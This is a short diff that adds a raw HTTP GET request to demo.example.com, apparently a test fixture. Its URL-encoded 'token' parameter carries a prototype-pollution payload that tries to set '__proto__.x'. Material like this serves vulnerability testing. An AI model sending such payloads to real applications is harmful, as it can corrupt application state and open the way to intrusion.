@@ -1,0 +1,4 @@
+GET /a?token=set%28%7B%7D%2C%2B%27__proto__.x%27%2C%2B1%29 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
